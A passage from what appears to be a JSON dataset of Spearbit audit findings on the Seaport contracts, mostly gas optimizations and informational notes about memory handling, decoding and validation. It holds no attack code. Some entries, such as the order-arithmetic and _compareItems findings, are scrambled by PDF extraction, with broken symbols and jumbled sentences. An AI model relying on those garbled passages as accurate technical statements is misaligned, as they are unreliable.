0000000000000000000000000000000000000000000000000000000000000000 ; > consideration.token (NATIVE) 0x300 0000000000000000000000000000000000000000000000000000000000000000 ; > consideration.identifierOrCriteria ,! 0x320 0000000000000000000000000000000000000000000000000000000000000001 ; > consideration's current interpolated amount ,! 0x340 000000000000000000000000f372379f3c48ad9994b46f36f879234a27b45561 ; > offerer 0x360 0000000000000000000000000000000000000000000000000000000000000000 ; unused 0x380 0000000000000000000000000000000000000000000000000000000000000000 ; unused 0x3a0 0000000000000000000000000000000000000000000000000000000000000000 ; unused 0x3c0 0000000000000000000000000000000000000000000000000000000000000000 ; unused 0x3e0 0000000000000000000000000000000000000000000000000000000000000040 ; sig.length 0x400 26aa4a333d4b615af662e63ce7006883f678068b8dc36f53f70aa79c28f2032c ; sig[ 0:31] 0x420 f640366430611c54bafd13314285f7139c85d69f423794f47ee088fc6bfbf43f ; sig[32:63] 0x440 0000000000000000000000000000000000000000000000000000000000000001 ; fulfilled = 1; // returns ,! (bool fulfilled) Notice that 4 unused memory slots.  Transaction Trace This is also a good example to see that certain memory slots that previously held values like zoneHash, salt, ... have been overwritten to due to the small number of consideration items (this actually happens inside _- prepareBasicFulfillmentFromCalldata).", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "TypehashDirectory's constructor code can be optimized.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "TypehashDirectory's deployed bytecode in its current form is: 00 3ca2711d29384747a8f61d60aad3c450405f7aaff5613541dee28df2d6986d32 ; h_00 bf8e29b89f29ed9b529c154a63038ffca562f8d7cd1e2545dda53a1b582dde30 ; h_01 53c6f6856e13104584dd0797ca2b2779202dc2597c6066a42e0d8fe990b0024d ; h_02 a02eb7ff164c884e5e2c336dc85f81c6a93329d8e9adf214b32729b894de2af1 ; h_03 39c9d33c18e050dda0aeb9a8086fb16fc12d5d64536780e1da7405a800b0b9f6 ; h_04 1c19f71958cdd8f081b4c31f7caf5c010b29d12950be2fa1c95070dc47e30b55 ; h_05 ca74fab2fece9a1d58234a274220ad05ca096a92ef6a1ca1750b9d90c948955c ; h_06 7ff98d9d4e55d876c5cfac10b43c04039522f3ddfb0ea9bfe70c68cfb5c7cc14 ; h_07 bed7be92d41c56f9e59ac7a6272185299b815ddfabc3f25deb51fe55fe2f9e8a ; h_08 d1d97d1ef5eaa37a4ee5fbf234e6f6d64eb511eb562221cd7edfbdde0848da05 ; h_09 896c3f349c4da741c19b37fec49ed2e44d738e775a21d9c9860a69d67a3dae53 ; h_10 bb98d87cc12922b83759626c5f07d72266da9702d19ffad6a514c73a89002f5f ; h_11 e6ae19322608dd1f8a8d56aab48ed9c28be489b689f4b6c91268563efc85f20e ; h_12 6b5b04cbae4fcb1a9d78e7b2dfc51a36933d023cf6e347e03d517b472a852590 ; h_13 d1eb68309202b7106b891e109739dbbd334a1817fe5d6202c939e75cf5e35ca9 ; h_14 1da3eed3ecef6ebaa6e5023c057ec2c75150693fd0dac5c90f4a142f9879fde8 ; h_15 eee9a1392aa395c7002308119a58f2582777a75e54e0c1d5d5437bd2e8bf6222 ; h_16 c3939feff011e53ab8c35ca3370aad54c5df1fc2938cd62543174fa6e7d85877 ; h_17 0efca7572ac20f5ae84db0e2940674f7eca0a4726fa1060ffc2d18cef54b203d ; h_18 5a4f867d3d458dabecad65f6201ceeaba0096df2d0c491cc32e6ea4e64350017 ; h_19 80987079d291feebf21c2230e69add0f283cee0b8be492ca8050b4185a2ff719 ; h_20 3bd8cff538aba49a9c374c806d277181e9651624b3e31111bc0624574f8bca1d ; h_21 5d6a3f098a0bc373f808c619b1bb4028208721b3c4f8d6bc8a874d659814eb76 ; h_22 1d51df90cba8de7637ca3e8fe1e3511d1dc2f23487d05dbdecb781860c21ac1c ; h_23 for height 24", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "ConsiderationItem.recipient's absolute memory offset can be cached and reused", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "ConsiderationItem.recipient's absolute offset is calculated twice in the above context.", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "currentAmount can potentially be reused when storing this value in memory in _validateOrdersAnd- PrepareToFulfill", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "We have considerationItem.startAmount = currentAmount; // 1 ... mload( // 2 add( considerationItem, ReceivedItem_amount_offset ) ) From 1 where considerationItem.startAmount is assigned till 2 its value is not modifed.", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "Information packed in BasicOrderType and how receivedItemType and offeredItemType are derived", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Currently the way information is packed and unpacked in/from BasicOrderType is inefficient. Basi- cOrderType is only used for BasicOrderParameters and when unpacking to give an idea how diffferent parameters are packed into this field.", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "invalidNativeOfferItemErrorBuffer calculation can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "We have: func sig ------------------------------------------------------------------------------ 0b10101000000101110100010 00 0000100 0b01010101100101000100101 00 1000010 0b11101101100110001010010 10 1110100 0b10000111001000000001101 10 1000001 ^ 9th bit matchOrders matchAdvancedOrders fulfillAvailableOrders fulfillAvailableAdvancedOrders", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "When accessing or writing to memory the value of an enum for a struct field, the enum's validation is performed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When accessing or writing to memory the value of an enum type for a struct field, the enum's validation is performed: enum Foo { f1, f2, ... fn } struct boo { Foo foo; ... } boo memory b; P(b.foo); // <--- validation will be performed to check whether the value of `b.foo` is out of range This would apply to OrderComponents.orderType, OrderParameters.orderType, CriteriaResolver.side, ReceivedItem.itemType, OfferItem.itemType, BasicOrderParameters.basicOrderType. ConsiderationItem.itemType, SpentItem.itemType,", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "The zero memory slot can be used when supplying no criteria to fulfillOrder, fulfillAvailable- Orders, and matchOrders", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When the external functions in this context are called, no criteria is passed to _validateAndFulfil- lAdvancedOrder, _fulfillAvailableAdvancedOrders, or _matchAdvancedOrders: new CriteriaResolver[](0), // No criteria resolvers supplied. When this gets compiled into YUL, the compiler updates the free memory slot by a word and performs an out of range and overflow check for this value: 34 function allocate_memory_<ID>() -> memPtr { memPtr := mload(64) let newFreePtr := add(memPtr, 32) if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr)) { panic_error_0x41() } mstore(64, newFreePtr) }", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "matchOrders, matchAdvancedOrders, fulfillAvailableAdvancedOrders, fulfillAvailableOrders re- turns executions which is cleaned and validator by the compiler", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Currently, the return values of matchOrders, matchAdvancedOrders, fulfillAvailableAdvance- dOrders, fulfillAvailableOrders are cleaned and validator by the compiler.", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "abi.encodePacked is used when only bytes/string concatenation is needed.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In the context above, one is using abi.encodePacked like the following: 35 bytes memory B = abi.encodePacked( \"<B1>\", \"<B2>\", ... \"<Bn>\" ); For each substring, this causes the compiler to use an mstore (if the substring occupies more than 32 bytes, it will use the least amount of mstores which is the ceiling of the length of substring divided by 32), even though multiple substrings can be combined to fill in one memory slot and thus only use 1 mstore for those.", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "solc ABI encoder is used when OrderFulfilled is emitted in _emitOrderFulfilledEvent", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "solc's ABI encoder is used when OrderFulfilled is emitted in _emitOrderFulfilledEvent. That means all the parameters are cleaned and validated before they are provided to log3.", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "The use of identity precompile to copy memory need not be optimal across chains", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "The PointerLibraries contract uses a staticcall to identity precompile, i.e., address 4 to copy memory--poor man's memcpy. This is used as a cheaper alternative to copy 32-byte chunks of memory using mstore(...) in a for-loop. However, the gas efficiency of the identity precompile relies on the version of the EVM on the underlying chain. The base call cost for precompiles before Berlin hardfork was 700 (from Tangerine Wistle), and after Berlin, this was reduced to 100 (for warm accounts and precompiles). Many EVM compatible L1s, and even L2s are on old EVM versions. And using the identity precompile would be more expensive than doing mstores(...).", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "Use the zero memory slot for allocating empty data", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In cases where an empty data needs to be allocated, one can use the zero slot. This can also be used as initial values for offer and consideration in abi_decode_generateOrder_returndata.", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "Some address fields are masked even though the ConsiderationDecoder wanted to skip this mask- ing", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When a field of address type from a struct in memory is used, the compiler masks (also: 2, 3) it. struct A { address addr; } A memory a; // P is either a statement or a function call // when compiled --> and(mload(a_addr_pos), 0xffffffffffffffffffffffffffffffffffffffff) P(a.addr); Also the compiler is making use of function cleanup_address(value) -> cleaned { cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff) } function abi_encode_address(value, pos) { mstore(pos, and(value, 0xffffffffffffffffffffffffffffffffffffffff)) } in a few places", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "div(x, (1<<n)) can be transformed into shr(n, x)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "The above context, one is dividing a number by a constant which is power of 2: div(x, c) // where c = 1 << n One can perform the same operation using shr which cost less gas.", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "Use fallback() to circumvent Solidity's dispatcher mechanism", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Among other things, the optimization steps are adding extra byte codes that are unnecessary for the dispatching mechanism. For example the Expression Simplifer is transforming the following calldata size comparisons: // slt(sub(calldatasize(), 4), X) push1 0x4 calldatasize sub slt into: // slt(add(calldatasize(), 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc), X) push32 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc calldatasize add slt And this happens for each exposed endpoint. This particular optimization rule is helpful if one could reorder and combine the constant value with another one ( A + (X (cid:0) B) ! (A (cid:0) B) + X , here A, B are constants and X is a variable ). But in this particular instance, the dispatcher does not perform better or worse in regards to the runtime code gas (it stays the same) but the optimization grows the bytecode size.  Note: The final bytecode depends on the options provided to solc. For the above finding, the default hardhat settings is used without the NO_SPECIALIZER flag.", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "The arithmetic in _validateOrderAndUpdateStatus can be simplified/optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "orderStatus.numerator and orderStatus.denominator contains multiple nested if/else blocks and for certain conditions/paths extra operations are performed. advancedOrder.numerator, arithmetic involving The variable description na advancedOrder.numerator 46 variable description da ns ds advancedOrder.denominator orderStatus.numerator orderStatus.denominator Depending on the case, the final outputs need to be:  Case 1. ds = 0 In this case na, da will be unmodified (besides the constraint checks)  Case 2. ds 6= 0, da = 1 In this case the remaining of the order will be filled and we would have (na, ns, da, ds) = (na, na, da, da) (na, ns, da, ds) = (ds (cid:0) ns, ds, ds, ds) Note that the invariant d (cid:21) n for new fractions and the combined ones is always guaranteed and so ds (cid:0) ns would not underflow.  Case 3. ds 6= 0, da 6= 1, da = ds Below (cid:15) = (na + ns > ds)(na + ns (cid:0) ds) is choosen so that order would not be overfilled. The parameters used in calculating (cid:15) are taken before they have been updated.  Case 4. ds 6= 0, da 6= 1, da 6= ds (na, ns, da, ds) = (na (cid:0) (cid:15), na + ns (cid:0) (cid:15), ds, ds) Below (cid:15) = (nads + nsda > dads)(nads + nsda (cid:0) dads) is choosen so that order would not be overfilled. And in case the new values go beyond 120 bits, G = gcd(nads (cid:0) (cid:15), nads + nsda (cid:0) (cid:15), dads), otherwise G will be 1. The parameters used in calculating (cid:15), G are taken before they have been updated. (na, ns, da, ds) = 1 G (nads (cid:0) (cid:15), nads + nsda (cid:0) (cid:15), dads, dads) If one of the updated values occupies more than 120 bits, the call will be reverted.", "labels": ["Spearbit", "Seaport", "Severity: Gas Optimization"]}, {"title": "The magic return value checks can be made stricter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "The magic return value check for ZoneInteraction can be made stricter. 1. It does not check the lower 28 bytes of the return value. 2. It does not check if extcodesize() of the zone is non-zero. In particular, for the identity precompile, the magic check would pass. This is, however, a general issue with the pattern where magic values are the same as the function selector and not specific to the Zone.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Resolving additional offer items supplied by contract orders with criteria can be impractical", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Contract orders can supply additional offer amounts when the order is executed. However, if they supply extra offer items with criteria, on the fly, the fulfiller won't be able to supply the necessary criteria resolvers (the correct Merkle proofs). This can lead to flaky orders that are impractical to fulfill.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Use of confusing named constant SpentItem_size in a function that deals with only ReceivedItem", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "The named constant SpentItem_size is used in the function copyReceivedItemsAsConsidera- tionItems, even though the context has nothing to do with SpentItem.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "The ABI-decoding of generateOrder returndata does not have sufficient checks to prevent out of bounds returndata reads", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "There was some attempt to avoid out of bounds returndata access in the ConsiderationDecoder. However, the two returndatacopy(...) in ConsiderationDecoder.sol#L456-L461 can still lead to out of bounds access and therefore may revert. Assume that code reaches the line ConsiderationDecoder.sol#L456. We have the following constraints 1. returndatasize >= 4 * 32: ConsiderationDecoder.sol#L428 2. offsetOffer <= returndatasize: ConsiderationDecoder.sol#L444 3. offsetConsideration <= returndatasize: ConsiderationDecoder.sol#L445 If we pick a returndata that satisfies 1 and let offsetOffer == offsetConsideration == returndatasize, all the constraints are true. But the returndatacopy would be revert due to an out-of-bounds read. Note: High-level Solidity avoids reading from out of bounds returndata. This is usually done by checking if re- turndatasize() is large enough for static data types and always doing returndatacopy of the form returndata- copy(x, 0, returndatasize()).", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Consider renaming writeBytes to writeBytes32", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "The function name writeBytes is not accurate in this context.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Missing test case for criteria-based contract orders and identifierOrCriteria != 0 case", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "The only test case for criteria-based contract orders in advanced.spec.ts#L434. This tests the case for identifierOrCriteria == 0. For the other case, identifierOrCriteria != 0 tests are missing.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "NatSpec comment for conduitKey in bulkTransfer() says \"optional\" instead of \"mandatory\"", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "The NatSpec comment says that conduitKey is optional but there is a check making sure that this value is always supplied.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Comparing the magic values returned by different contracts are inconsistent", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In ZoneInteraction's _callAndCheckStatus we perform the following comparison for the returned magic value: let magic := shr(224, mload(callData)) magicMatch := eq(magic, shr(224, mload(0))) But the returned magic value comparison in _assertValidSignature without truncating the returned value: if iszero(eq(mload(0), EIP1271_isValidSignature_selector))", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Document the structure of the TypehashDirectory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Instances of TypehashDirectory would act as storage contracts with runtime bytecode: [0x00 - 0x00] 00 [0x01 - 0x20] h(struct BulkOrder { OrderComponents[2] [0x21 - 0x40] h(struct BulkOrder { OrderComponents[2][2] ... [0xNN - 0xMM] h(struct BulkOrder { OrderComponents[2][2]...[2] tree }) tree }) tree }) 56 h calculates the eip-712 typeHash of the input struct. 0xMM would be mul(MaxTreeHeight, 0x20) and 0xNN = 0xMM - 0x1f.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Document what twoSubstring encodes", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "We have: bytes32 constant twoSubstring = 0x5B325D0000000000000000000000000000000000000000000000000000000000; which encodes: cast --to-ascii 0x5B325D0000000000000000000000000000000000000000000000000000000000 [2]", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Upper bits of the to parameter to call opcodes are stripped out by clients", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Upper bits of the to parameter to call opcodes are stripped out by clients. For example, geth would strip the upper bytes out:  instructions.go#L674  uint256.go#L114-L121 So even though the to parameters in this context can have dirty upper bits, the call opcodes can be successful, and masking these values in the contracts is not necessary for this context.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Remove unused functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "The functions in the above context are not used in the codebase.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Fulfillment_itemIndex_offset can be used instead of OneWord", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In the above context, one has: // Get the item index using the fulfillment pointer. itemIndex := mload(add(mload(fulfillmentHeadPtr), OneWord))", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Document how the _pauser role is assigned for PausableZoneController", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "The _pauser role is an important role for a PausableZoneController. It can pause any zone created by this controller and thus transfer all the native token funds locked in that zone to itself.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "_aggregateValidFulfillmentConsiderationItems's memory layout assumptions depend on _val- idateOrdersAndPrepareToFulfill's memory manipulation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "ceivedItem.recipient's offset of considerationItemPtr to write to receivedItem at offset (the same offset is also used here): _aggregateValidFulfillmentConsiderationItems are we In the Re- the same // Set the recipient on the received item. mstore( add(receivedItem, ReceivedItem_recipient_offset), mload(add(considerationItemPtr, ReceivedItem_recipient_offset)) ) looks buggy, This tion[i].endAmount with consideration[i].recipient: but in _validateOrdersAndPrepareToFulfill(...) we overwrite considera- mstore( add( considerationItem, ReceivedItem_recipient_offset // old endAmount ), mload( add( considerationItem, ConsiderationItem_recipient_offset ) ) ) in _fulfillAvailableAdvancedOrders and Also _validateOrdersAndPrepareToFulfill gets called first _matchAdvancedOrders. This is important since the memory for the consideration arrays needs to be updated before we reach _aggregateValidFulfillmentConsiderationItems. 59", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "recipient is provided as the fulfiller for the OrderFulfilled event", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In the above context in general it is not true that the recipient is the fulfiller. Also note that recipient is address(0) for match orders.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "availableOrders[i] return values need to be explicitly assigned since they live in a region of memory which might have been dirtied before", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Seaport 1.1 did not have the following default assignment: if (advancedOrder.numerator == 0) { availableOrders[i] = false; continue; } But this is needed here since the current memory region which was previously used by the accumulator might be dirty.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Usage of MemoryPointer / formatting inconsistent in _getGeneratedOrder", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Usage of MemoryPointer / formatting is inconsistent between the loop used OfferItems and the loop used for ConsiderationItems.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "newAmount is not used in _compareItems", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "newAmount is unused in _compareItems. If originalItem points to I = (t, T , i, as, ae) and the newItem to Inew = (t 0, T 0, i 0, a0 s, a0 e) where parameter description t 0 t T , T 0 i 0 i as, a0 s ae, a0 e c then we have itemType itemType for I after the adjustment for restricted collection items token identifierOrCriteria identifierOrCriteria for I after the adjustment for restricted collection items startAmount endAmount _compareItems c(I, Inew ) = (t 6= t 0) _ (T 6= T 0) _ (i 6= i 0) _ (as 6= ae) and so we are not comparing either as to a0 enforced. In _getGeneratedOrder we have the following check: as > a0 errorBuffer. inequality is reversed for consideration items). And so in each loop (t 6= t 0) _ (T 6= T 0) _ (i 6= i 0) _ (as 6= ae) _ (as > a0 s or a0 s to a0 e. In abi_decode_generateOrder_returndata a0 s = a0 e is s (invalid case for offer items that contributes to s) is ored to errorBuffer.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "reformat validate so that its body is consistent with the other external functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "For consistency with other functions we can rewrite validate as: function validate( Order[] calldata /* orders */ ) external override returns (bool /* validated */ ) { return _validate(to_dyn_array_Order_ReturnType( abi_decode_dyn_array_Order )(CalldataStart.pptr())); } Needs to be checked if it changes code size or gas cost. Seaport: Fixed in PR 824. Spearbit: Verified.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Add commented parameter names (Type Location /* name */)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Add commented parameter names (Type Location /* name */) for validate: Order[] calldata /* orders */ Seaport: Fixed in commit 74de34. Spearbit: Verified.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Document that the height provided to _lookupBulkOrderTypehash can only be in a certain range", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Need to have height h provided to _lookupBulkOrderTypehash such that: 1 + 32(h (cid:0) 1) 2 [0, min(0xffffffffffffffff, typeDirectory.codesize) (cid:0) 32] Otherwise typeHash := mload(0) would be 0 or would be padded by zeros. When extcodecopy gets executed extcodecopy(directory, 0, typeHashOffset, 0x20) clients like geth clamp typehashOffset to minimum of 0xffffffff_ffffffff and directory.codesize and pads the result with 0s if out of range. ref:  instructions.go#L373 62  common.go#L54", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Unused imports can be removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "The imported contents in this context are unused.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "msg.sender is provided as the fulfiller input parameter in a few locations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "msg.sender is provided as the fulfiller input parameter.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Differences and similarities of ConsiderationDecoder and solc when decoding dynamic arrays of static/fixed base struct type", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "The way OfferItem[] in abi_decode_dyn_array_OfferItem and ConsiderationItem[] in abi_- decode_dyn_array_ConsiderationItem are decoded are consistent with solc regarding this:  For dynamic arrays of static/fixed base struct type, the memory region looks like: 63 [mPtrLength --------------------------------------------------- [mPtrLength + 0x20: mPtrLength + 0x40) : mPtrLength + 0x20) arrLength memberTail1 - a memory pointer to the array's 1st element ,! ... [mPtrLength + ...: mPtrLength + ...) memberTailN - a memory pointer to the array's Nth element ,! --------------------------------------------------- [memberTail1 ... [memberTailN : memberTail1 + <STRUCT_SIZE>) element1 : memberTailN + <STRUCT_SIZE>) elementN The difference is solc decodes and validates (checking dirty bytes) each field of the elements of the array (which are static struct types) separately (one calldataload and validation per field per element). ConsiderationDecoder skips all those validations for both OfferItems[] and ConsiderationItems[] by copying a chunk of calldata to memory (the tail parts): calldatacopy( mPtrTail, add(cdPtrLength, 0x20), mul(arrLength, OfferItem_size) ) That means for OfferItem[], itemType and token (and also recipient for ConsiderationItem[]) fields can potentially have dirty bytes.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "PointerLibraries's malloc skips some checks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "malloc in PointerLibraries skips checking if add(mPtr, size) is OOR or wraps around. Solidity does the following when allocating memory: 64 function allocate_memory(size) -> memPtr { memPtr := allocate_unbounded() finalize_allocation(memPtr, size) } function allocate_unbounded() -> memPtr { memPtr := mload(<freeMemoryPointer>) } function finalize_allocation(memPtr, size) { let newFreePtr := add(memPtr, round_up_to_mul_of_32(size)) // protect against overflow if or(gt(newFreePtr, 0xffffffff_ffffffff), lt(newFreePtr, memPtr)) { // <-- the check that is skipped panic_error_<code>() } mstore(<freeMemoryPointer>, newFreePtr) } function round_up_to_mul_of_32(value) -> result { result := and(add(value, 31), not(31)) } function panic_error_<code>() { // <selector> = cast sig \"Panic(uint256)\" mstore(0, <selector>) mstore(4, <code>) revert(0, 0x24) } Also note, rounding up the size to the nearest word boundary is hoisted out of malloc.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "abi_decode_bytes can populate memory with dirty bytes", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When abi_decode_bytes decodes bytes, it rounds its size and copies the rounded size from calldata to memory. This memory region might get populated with dirty bytes. So for example: For both signature and extraData we are using abi_decode_bytes. If the AdvancedOrder is tightly packed and:  If signature's length is not a multiple of a word (0x20) part of the extraData.length bytes will be copied/duplicated to the end of signature's last memory slot.  If extraData's length is not a multiple of a word (0x20) part of the calldata that comes after extraData's tail will be copied to memory. Even if AdvancedOrder is not tightly packed (tail offsets are multiple of a word relative to the head), the user can stuff the calldata with dirty bits when signature's or extraData's length is not a multiple of a word. And those dirty bits will be carried over to memory during decoding. Note, these extra bits will not be overridden or 65 cleaned during the decoding because of the way we use and update the free memory pointer (incremented by the rounded-up number to a multiple of a word).", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "abi_encode_validateOrder reuses a memory region", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "It is really important to note that before abi_encode_validateOrder is called, _prepareBasicFul- fillmentFromCalldata(...) needs to be called to populate the memory region that is used for event OrderFul- filled(...) which can be reused/copied in this function: MemoryPointer.wrap(offerDataOffset).copy( dstHead.offset(tailOffset), offerAndConsiderationSize ); From when the memory region for OrderFulfilled(...) is populated till we reach this point, care needs to be taken to not modified that region. accumulator data is written to the memory after that region and the current implementation does not touch that region during the whole call after the event has been emitted.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "abi_encode_validateOrder writes to a memory region that might have been potentially dirtied by accumulator", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In abi_encode_validateOrder potentially (in the future), we might be writing in an area where accumulator was used. And since the book-keeping for the accumulator does not update the free memory pointer, we need to make sure all bytes in the memory in the range [dst, dst+size) are fully updated/written to in this function.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Reorder writing to memory in ConsiderationEncoder to follow the order in struct definitions.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Reorder the memory writes in ConsiderationEncoder to follow the order in struct definitions.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "The compiled YUL code includes redundant consecutive validation of enum types", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Half the location where an enum type struct field has been used/accessed, the validation function for this enum type is performed twice: validator_assert_enum_<ENUM_NAME>(memPtr) validator_assert_enum_<ENUM_NAME>(memPtr)", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Consider writing tests for revert functions in ConsiderationErrors", "html_url": 